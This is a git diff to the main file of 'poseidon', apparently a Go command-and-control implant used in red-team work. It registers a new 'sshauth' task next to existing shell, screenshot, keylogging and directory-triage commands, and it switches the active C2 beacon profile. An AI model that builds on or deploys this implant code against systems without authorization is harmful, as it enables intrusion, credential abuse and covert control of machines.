@@ -17,11 +17,12 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/screenshot"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
+	"github.com/xorrior/poseidon/pkg/commands/sshauth"
+	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
-import "github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 
 //export RunMain
 func RunMain() {
@@ -37,8 +38,8 @@ func main() {
 	currIP := functions.GetCurrentIPAddress()
 	currPid := os.Getpid()
 	// Modify the profile used by changing this line
-	// profile := profiles.C2Patchthrough{}
-	profile := profiles.C2Default{}
+	profile := profiles.C2Patchthrough{}
+	// profile := profiles.C2Default{}
 	// profile := profiles.C2Slack{}
 	// profile := profiles.C2Websocket{}
 	profile.SetUniqueID(profiles.UUID)
@@ -85,6 +86,7 @@ func main() {
 		"jxa":             13,
 		"keys":            14,
 		"triagedirectory": 15,
+		"sshauth":         16,
 		"none":            20,
 	}
 
@@ -183,6 +185,9 @@ func main() {
 				break
 			case 15:
 				go triagedirectory.Run(task, res)
+				break
+			case 16:
+				go sshauth.Run(task, res)
 				break
 			case 20:
 				// No tasks, do nothing
